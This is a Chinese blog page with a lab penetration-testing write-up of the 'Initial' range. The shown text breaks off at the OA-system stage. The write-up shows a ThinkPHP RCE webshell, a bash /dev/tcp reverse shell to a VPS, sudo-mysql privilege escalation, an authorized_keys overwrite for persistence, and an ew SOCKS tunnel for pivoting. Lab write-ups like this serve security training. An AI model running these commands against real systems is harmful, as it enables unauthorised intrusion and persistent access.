<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8" data-next-head=""/><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0" data-next-head=""/><meta name="robots" content="index,follow" data-next-head=""/><meta name="description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta name="twitter:card" content="summary_large_image" data-next-head=""/><meta name="twitter:site" content="@sunset" data-next-head=""/><meta name="twitter:creator" content="@sunset" data-next-head=""/><meta property="og:title" content="Sunset Blog" data-next-head=""/><meta property="og:description" content="Sunset的个人博客，记录生活学习点滴。分享网络安全、渗透测试、CTF writeup、技术文章等内容。" data-next-head=""/><meta property="og:url" content="https://www.sunsetaction.top" data-next-head=""/><meta property="og:type" content="website" data-next-head=""/><meta property="og:image" content="https://www.sunsetaction.top/images/logo.png" data-next-head=""/><meta property="og:image:alt" content="Sunset Blog Logo" data-next-head=""/><meta property="og:image:type" content="image/png" data-next-head=""/><meta property="og:image:width" content="800" data-next-head=""/><meta property="og:image:height" content="800" data-next-head=""/><meta property="og:locale" content="zh_CN" data-next-head=""/><meta property="og:site_name" content="Sunset Blog" data-next-head=""/><link rel="canonical" href="https://www.sunsetaction.top" data-next-head=""/><meta property="dc:creator" content="Sunset" data-next-head=""/><meta name="application-name" content="Sunset Blog" data-next-head=""/><meta name="keywords" content="Sunset,个人博客,网络安全,渗透测试,CTF,HackTheBox,HackMyVM,技术博客" data-next-head=""/><meta name="author" content="Sunset" data-next-head=""/><link rel="icon" href="https://www.sunsetaction.top/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="https://www.sunsetaction.top/images/logo.png" sizes="180x180" data-next-head=""/><link rel="icon" href="/images/Logo.ico" data-next-head=""/><link rel="apple-touch-icon" href="/images/logo.png" data-next-head=""/><meta name="theme-color" content="#b91c1c" data-next-head=""/><link rel="preload" href="/fonts/LXGWWenKai-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><link rel="preload" href="/fonts/IBMPlexMono-Regular.ttf" as="font" type="font/ttf" crossorigin="anonymous" data-next-head=""/><title data-next-head="">重定向中...</title><link rel="preload" href="/_next/static/css/e3722a685bf8da82.css" as="style"/><link rel="stylesheet" href="/_next/static/css/e3722a685bf8da82.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" noModule="" src="/_next/static/chunks/polyfills-42372ed130431b0a.js"></script><script src="/_next/static/chunks/webpack-d2c05f55b5519780.js" defer=""></script><script src="/_next/static/chunks/framework-2f335d22a7318891.js" defer=""></script><script src="/_next/static/chunks/main-57af89c0b17dff61.js" defer=""></script><script src="/_next/static/chunks/pages/_app-c63903712a141bbb.js" defer=""></script><script src="/_next/static/chunks/669-a48a697ea8aebbc4.js" defer=""></script><script src="/_next/static/chunks/pages/posts/%5Bid%5D-bb6c42847cbf8692.js" defer=""></script><script src="/_next/static/TnJI9VBCcFHK0DidNwqYO/_buildManifest.js" defer=""></script><script src="/_next/static/TnJI9VBCcFHK0DidNwqYO/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div class="min-h-screen bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="w-full bg-[#fafafa] dark:bg-[#1f2022]" style="opacity:0;transform:translateY(20px)"><div class="text-gray-700 dark:text-gray-300 flex flex-col min-h-screen font-[LXGWWenKai] bg-[#fafafa] dark:bg-[#1f2022] transition-colors duration-300"><div class="flex flex-col items-center justify-center"><header class="flex justify-center md:mt-12 mt-5"><div><div class="flex items-center justify-center md:justify-start"><div class="md:text-3xl text-xl font-extrabold text-red-700 dark:text-red-400 ml-4">Sunset&#x27;s Blog</div></div><div class="mt-2 grid grid-cols-5"><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/">Home</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/writing/">Writing</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/tags/">Tags</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/about/">About</a></button><button data-slot="button" class="inline-flex items-center justify-center whitespace-nowrap font-medium transition-all disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg:not([class*=&#x27;size-&#x27;])]:size-4 shrink-0 [&amp;_svg]:shrink-0 outline-none focus-visible:border-ring focus-visible:ring-ring/50 focus-visible:ring-[3px] aria-invalid:ring-destructive/20 dark:aria-invalid:ring-destructive/40 aria-invalid:border-destructive hover:bg-accent hover:text-accent-foreground dark:hover:bg-accent/50 py-2 h-8 rounded-md gap-1.5 px-2 has-[&gt;svg]:px-1.5 text-xs md:text-sm"><a href="/search/">Search</a></button></div></div></header></div><main class="flex justify-center flex-grow"><div class="w-full md:w-3xl mt-5 md:mt-15 text-center"><p>正在跳转到新地址...</p></div></main><footer class="w-full py-6 mt-12"><div class="max-w-4xl mx-auto px-4 text-center"><p class="text-sm text-gray-500 dark:text-gray-400">Copyright © <!-- -->2025<!-- --> Sunset.</p></div></footer></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"postData":{"id":"春秋云镜Initial","contentHtml":"\u003ch1\u003eInitial\u003c/h1\u003e\n\u003cblockquote\u003e\n\u003cp\u003e\u003ca href=\"https://yunjing.ichunqiu.com/major/detail/1077?type=1\"\u003ehttps://yunjing.ichunqiu.com/major/detail/1077?type=1\u003c/a\u003e\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003ch2\u003e前期踩点\u003c/h2\u003e\n\u003cp\u003e直接使用 \u003ccode\u003efscan\u003c/code\u003e 扫描 （靶机IP：\u003ccode\u003e39.99.128.239\u003c/code\u003e）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  ./fscan -h 39.99.128.239\n┌──────────────────────────────────────────────┐\n│    ___                              _        │\n│   / _ \\     ___  ___ _ __ __ _  ___| | __    │\n│  / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /    │\n│ / /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;     │\n│ \\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\    │\n└──────────────────────────────────────────────┘\n      Fscan Version: 2.0.0\n\n[2025-03-15 00:26:11] [INFO] 暴力破解线程数: 1\n[2025-03-15 00:26:11] [INFO] 开始信息扫描\n[2025-03-15 00:26:11] [INFO] 最终有效主机数量: 1\n[2025-03-15 00:26:11] [INFO] 开始主机扫描\n[2025-03-15 00:26:11] [INFO] 有效端口数量: 233\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:110\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:21\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:22\n[2025-03-15 00:26:11] [SUCCESS] 端口开放 39.99.128.239:80\n[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:21 =\u003e \n[2025-03-15 00:26:11] [SUCCESS] 服务识别 39.99.128.239:22 =\u003e [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]\n[2025-03-15 00:26:13] [SUCCESS] 服务识别 39.99.128.239:110 =\u003e \n[2025-03-15 00:26:17] [SUCCESS] 服务识别 39.99.128.239:80 =\u003e [http]\n[2025-03-15 00:26:21] [INFO] 存活端口数量: 4\n[2025-03-15 00:26:21] [INFO] 开始漏洞扫描\n[2025-03-15 00:26:21] [INFO] 加载的插件: ftp, pop3, ssh, webpoc, webtitle\n[2025-03-15 00:26:21] [SUCCESS] 网站标题 http://39.99.128.239      状态码:200 长度:5578   标题:Bootstrap Material Admin\n[2025-03-15 00:26:28] [SUCCESS] 目标: http://39.99.128.239:80\n  漏洞类型: poc-yaml-thinkphp5023-method-rce\n  漏洞名称: poc1\n  详细信息:\n        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003eThinkphp 5.0.23 RCE\u003c/h2\u003e\n\u003cp\u003e直接扫出来了\u003ccode\u003eThinkphp\u003c/code\u003e的\u003ccode\u003erce\u003c/code\u003e漏洞，使用工具一把梭哈\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接\u003ccode\u003eGETSHELL\u003c/code\u003e ，在网站目录下生成一个一句话木马\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image1.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e我们使用蚁剑连接\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image2.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e虚拟终端查看权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e(www-data:/var/www/html) $ \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e\nwww-data\n(www-data:/var/www/html) $ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e -l\nMatching Defaults entries \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e www-data on ubuntu-web01:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on ubuntu-web01:\n    (root) NOPASSWD: /usr/bin/mysql\n(www-data:/var/www/html) $  \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e可以以\u003ccode\u003eroot\u003c/code\u003e权限执行\u003ccode\u003emysql\u003c/code\u003e ，通过\u003ccode\u003egtfobins\u003c/code\u003e来寻找利用方法：\u003ca href=\"https://gtfobins.github.io/gtfobins/mysql/\"\u003ehttps://gtfobins.github.io/gtfobins/mysql/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image3.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先反弹\u003ccode\u003eshell\u003c/code\u003e ，将\u003ccode\u003eshell\u003c/code\u003e 弹到 vps 上\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e bash -c \u003cspan class=\"hljs-string\"\u003e'exec bash -i \u0026#x26;\u003e/dev/tcp/ip/7777 \u0026#x3C;\u0026#x26;1'\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image4.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e提权，但是没有交互式\u003ccode\u003eshell\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003ewww-data@ubuntu-web01:/var/www/html$ \u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e mysql -e \u003cspan class=\"hljs-string\"\u003e'\\! /bin/sh'\u003c/span\u003e\n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e mysql -e \u003cspan class=\"hljs-string\"\u003e'\\! /bin/sh'\u003c/span\u003e\n\n\u003cspan class=\"hljs-built_in\"\u003eid\u003c/span\u003e\nuid=0(root) gid=0(root) \u003cspan class=\"hljs-built_in\"\u003egroups\u003c/span\u003e=0(root)\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e通过\u003ccode\u003efscan\u003c/code\u003e扫描我们能知道服务器开了\u003ccode\u003eSSH\u003c/code\u003e服务，在root下能找到\u003ccode\u003e.ssh\u003c/code\u003e并且存在\u003ccode\u003eauthorized_keys\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e我们生成新的\u003ccode\u003eSSH\u003c/code\u003e密钥对，并将\u003ccode\u003eid_rsa.pub\u003c/code\u003e覆盖\u003ccode\u003eauthorized_keys\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// kali\n⚡ root@kali  ~  ssh-keygen -t rsa\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// 靶机\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxXpjYGlyNDtcmbZOsYeg0b7nB7P0ltBXDjYhUBeqUxtWj7g8c3z2us9m1DZupz2u2pW4TfEFLRUC0L0+itO0eZ5stffv4DZSTElKUFToFDpFcOmvNeLhS7l2L7MM9Vzj0W57+aXumMfeNlTVqM39+yc0tbSBUUA3Kx4hdsHTdjsktWPBdUfLQyGoYGLEB3Lg3jy8WJceLuTP0Ri3Bm/Osr1o28Gd9YRF2unzV6pW8kbOpKz2BcsiknYeGvfkh+PrxmZIr8j6o4TggaVfDYX7mXA+ClA2SgtDgcLs3pwSPeZulEF2JasqkPLJ8blKQMDzwHT2ijg11XXOarTl+B/T7AjmH12kD918jZ61n1ytYvfxBwrYLTFbS9YYKwPk/sCQBEgXqkhZUrTieq0byadADS1c3WnJc20J5UbsUv+au8jnt+WW0myh63R3JH7+kUUrI6Vqlpqqd4kb/IJaroPHjh7Ihck5l7M3+Wtqwh+/2Luo63t0wQZbZH79v9uCifEU= root@kali\"\u003c/span\u003e \u003e authorized_keys\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003eSSH\u003c/code\u003e连接，直接登陆成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ⚡ root@kali  ~  ssh root@39.99.128.239\n\nWelcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-110-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\nNew release \u003cspan class=\"hljs-string\"\u003e'22.04.5 LTS'\u003c/span\u003e available.\nRun \u003cspan class=\"hljs-string\"\u003e'do-release-upgrade'\u003c/span\u003e to upgrade to it.\n\nWelcome to Alibaba Cloud Elastic Compute Service !\n\nNo mail.\nLast login: Sat Mar 15 13:21:12 2025 from xxxxxxxx\nroot@ubuntu-web01:~# \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e（PS：打到这里沙砾没了，要重新开，这里开始靶机为 \u003ccode\u003e39.99.138.102\u003c/code\u003e）\u003c/p\u003e\n\u003cp\u003e当前目录下能找到\u003ccode\u003eflag01.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-perl\"\u003eroot\u003cspan class=\"hljs-variable\"\u003e@ubuntu\u003c/span\u003e-web01:~/flag\u003cspan class=\"hljs-comment\"\u003e# cat flag01.txt\u003c/span\u003e\n ██     ██ ██     ██       ███████   ███████       ██     ████     ██   ████████\n░░██   ██ ░██    ████     ██░░░░░██ ░██░░░░██     ████   ░██░██   ░██  ██░░░░░░██\n ░░██ ██  ░██   ██░░██   ██     ░░██░██   ░██    ██░░██  ░██░░██  ░██ ██      ░░\n  ░░███   ░██  ██  ░░██ ░██      ░██░███████    ██  ░░██ ░██ ░░██ ░██░██\n   ██░██  ░██ ██████████░██      ░██░██░░░██   ██████████░██  ░░██░██░██    █████\n  ██ ░░██ ░██░██░░░░░░██░░██     ██ ░██  ░░██ ░██░░░░░░██░██   ░░████░░██  ░░░░██\n ██   ░░██░██░██     ░██ ░░███████  ░██   ░░██░██     ░██░██    ░░███ ░░████████\n░░     ░░ ░░ ░░      ░░   ░░░░░░░   ░░     ░░ ░░      ░░ ░░      ░░░   ░░░░░░░░\n\nCongratulations!!! You found the first flag, the \u003cspan class=\"hljs-keyword\"\u003enext\u003c/span\u003e flag may be in a server in the internal network.\n\nflag01: flag{60b53231-\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e内网信息收集\u003c/h2\u003e\n\u003cp\u003e查看网卡信息，得知内网网段是\u003ccode\u003e172.22.1.0\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ubuntu-web01:~/flag# ip add\n1: lo: \u0026#x3C;LOOPBACK,UP,LOWER_UP\u003e mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: \u0026#x3C;BROADCAST,MULTICAST,UP,LOWER_UP\u003e mtu 1500 qdisc mq state UP group default qlen 1000\n    \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e/ether 00:16:3e:2d:93:7a brd ff:ff:ff:ff:ff:ff\n    inet 172.22.1.15/16 brd 172.22.255.255 scope global dynamic eth0\n       valid_lft 315359626sec preferred_lft 315359626sec\n    inet6 fe80::216:3eff:fe2d:937a/64 scope \u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e \n       valid_lft forever preferred_lft forever\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e上传\u003ccode\u003efscan\u003c/code\u003e 进行扫描\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  scp fscan root@39.99.138.102:/root\nfscan                                                            100% 8384KB   2.8MB/s   00:02   \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003eroot@ubuntu-web01:~# ./fscan -h 172.22.1.0/24                                                                     \n                                                                                                                                                                                                                                    \n   ___                              _                                                                             \n  / _ \\     ___  ___ _ __ __ _  ___| | __                                                                         \n / /_\\/____/ __|/ __| \u003cspan class=\"hljs-string\"\u003e'__/ _` |/ __| |/ /                                                                         \n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   \u0026#x3C;                                                                          \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\                                                                         \n                     fscan version: 1.8.4                                                                         \nstart infoscan                                           \n(icmp) Target 172.22.1.15     is alive                                                                            \n(icmp) Target 172.22.1.2      is alive          \n(icmp) Target 172.22.1.21     is alive                                                                            \n(icmp) Target 172.22.1.18     is alive                                                                            \n[*] Icmp alive hosts len is: 4                  \n172.22.1.18:3306 open\n172.22.1.18:445 open \n172.22.1.21:445 open\n172.22.1.2:445 open\n172.22.1.18:139 open\n172.22.1.21:139 open                                                                                                                                                                                                                \n172.22.1.2:139 open                             \n172.22.1.18:135 open\n172.22.1.21:135 open\n172.22.1.2:135 open\n172.22.1.18:80 open\n172.22.1.15:80 open\n172.22.1.15:22 open                                                                                               \n172.22.1.2:88 open                                                                                                                                                                                                                  \n[*] alive ports len is: 14                                                                                                                                                                                                          \nstart vulscan                                                                                                                                                                                                                       \n[*] NetInfo                                                                                                       \n[*]172.22.1.18                                                                                                    \n   [-\u003e]XIAORANG-OA01                        \n   [-\u003e]172.22.1.18\n[*] NetInfo \n[*]172.22.1.21                                                                                                    \n   [-\u003e]XIAORANG-WIN7                                     \n   [-\u003e]172.22.1.21                                       \n[*] NetInfo                                                                                                       \n[*]172.22.1.2                                                                                                     \n   [-\u003e]DC01                                              \n   [-\u003e]172.22.1.2                                                                                                 \n[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)                                                    \n[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)                           \n[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1                                                                                                               \n[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393             \n[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600            \n[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin                         \n[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login         \n[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统                                \n[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1                                              \n已完成 14/14                                             \n[*] 扫描结束,耗时: 7.72653891s                                                                                    \n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们获得了的\u003ccode\u003e172.22.1.15\u003c/code\u003e的\u003ccode\u003eshell\u003c/code\u003e ，那么\u003ccode\u003e172.22.1.2\u003c/code\u003e 、\u003ccode\u003e172.22.1.18\u003c/code\u003e 、\u003ccode\u003e172.22.1.21\u003c/code\u003e 是内网主机\u003c/p\u003e\n\u003cp\u003e并且内网主机\u003ccode\u003e172.22.1.21\u003c/code\u003e 存在永恒之蓝\u003c/p\u003e\n\u003ch2\u003e隧道搭建\u003c/h2\u003e\n\u003cp\u003e上传\u003ccode\u003eew\u003c/code\u003e搭建隧道\u003c/p\u003e\n\u003cp\u003evps：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./ew -s rcsocks -l 1080 -e 8889 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e靶机：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e./ew -s rssocks -d 8.134.163.255 -e 8889 \u0026#x26;\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003ekali\u003c/code\u003e设置代理，修改\u003ccode\u003eproxychain4\u003c/code\u003e ，添加\u003ccode\u003evps\u003c/code\u003e地址\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e ✘ ⚡ root@kali  ~/Desktop/Tools  \u003cspan class=\"hljs-built_in\"\u003etail\u003c/span\u003e -n 10 /etc/proxychains4.conf \n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#       proxy types: http, socks4, socks5, raw\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#         * raw: The traffic is simply forwarded to the proxy without modification.\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#        ( auth types supported: \"basic\"-http  \"user/pass\"-socks )\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e#\u003c/span\u003e\n[ProxyList]\n\u003cspan class=\"hljs-comment\"\u003e# add proxy here ...\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# meanwile\u003c/span\u003e\n\u003cspan class=\"hljs-comment\"\u003e# defaults set to \"tor\"\u003c/span\u003e\nsocks5  8.xxx.xxx.xxx   1080\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e测试是否成功\u003c/p\u003e\n\u003cp\u003e能获取到内网地址信息，隧道搭建成功\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/Tools  proxychains4 curl http://172.22.1.18\\?m\\=login -i                                                                                                                                                 \n[proxychains] config file found: /etc/proxychains4.conf  \n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4                                            \n[proxychains] DLL init: proxychains-ng 4.17                                                                       \n[proxychains] Strict chain  ...  8.xx.x.xxx:1080  ...  172.22.1.18:80  ...  OK                                                                                                                                                   \nHTTP/1.1 200 OK                                                                                                                                                                                                                     \nDate: Sat, 15 Mar 2025 06:03:05 GMT                      \nServer: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9                                                      \nX-Powered-By: PHP/7.1.9                                  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT                                                                            \nCache-Control: no-store, no-cache, must-revalidate       \nPragma: no-cache                                                                                                  \nSet-Cookie: PHPSESSID=6pqaa6aera5uvkab5ip1qv2o96; path=/                                                                                                                                                                            \nTransfer-Encoding: chunked    \nContent-Type: text/html;charset=utf-8         \n                                                                                                                  \n\u0026#x3C;!DOCTYPE html\u003e                                                                                                   \n\u0026#x3C;html lang=\u003cspan class=\"hljs-string\"\u003e\"zh-CN\"\u003c/span\u003e\u003e                                                                                               \n\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003ehead\u003c/span\u003e\u003e                                                                                                                                                                                                                              \n\u0026#x3C;!--\u0026#x3C;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"X-UA-Compatible\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"IE=edge\"\u003c/span\u003e\u003e--\u003e                                                      \n\u0026#x3C;meta http-equiv=\u003cspan class=\"hljs-string\"\u003e\"Content-Type\"\u003c/span\u003e content=\u003cspan class=\"hljs-string\"\u003e\"text/html; charset=utf-8\"\u003c/span\u003e /\u003e                                             \n\u0026#x3C;title\u003e信呼协同办公系统\u0026#x3C;/title\u003e                                                                                   \n\u0026#x3C;\u003cspan class=\"hljs-built_in\"\u003elink\u003c/span\u003e rel=\u003cspan class=\"hljs-string\"\u003e\"stylesheet\"\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/css\"\u003c/span\u003e href=\u003cspan class=\"hljs-string\"\u003e\"webmain/css/css.css\"\u003c/span\u003e/\u003e    \n\u0026#x3C;div class=\u003cspan class=\"hljs-string\"\u003e\"blank20\"\u003c/span\u003e\u003e\u0026#x3C;/div\u003e\n        \u0026#x3C;div align=\u003cspan class=\"hljs-string\"\u003e\"center\"\u003c/span\u003e style=\u003cspan class=\"hljs-string\"\u003e\"height:30px;line-height:30px;color:#555555\"\u003c/span\u003e\u003e\n                Copyright \u0026#x26;copy;2025 信呼协同办公系统v2.2.8 \u0026#x26;nbsp; - \u0026#x26;nbsp; \n                版权所有：\u0026#x3C;a href=\u003cspan class=\"hljs-string\"\u003e\"http://www.rockoa.com/\"\u003c/span\u003e style=\u003cspan class=\"hljs-string\"\u003e\"color:#1F83C1\"\u003c/span\u003e target=\u003cspan class=\"hljs-string\"\u003e\"_blank\"\u003c/span\u003e\u003e信呼开发团队\u0026#x3C;/a\u003e\n        \u0026#x3C;/div\u003e\n        \u0026#x3C;script \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e=\u003cspan class=\"hljs-string\"\u003e\"text/javascript\"\u003c/span\u003e src=\u003cspan class=\"hljs-string\"\u003e\"mode/plugin/jquery-rockmodels.js\"\u003c/span\u003e\u003e\u0026#x3C;/script\u003e                \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ccode\u003eWindows\u003c/code\u003e设置代理，使用\u003ccode\u003eproxifier\u003c/code\u003e 即可\u003c/p\u003e\n\u003ch2\u003e信呼协同办公系统 v2.2.8\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CInitial/image5.png\" 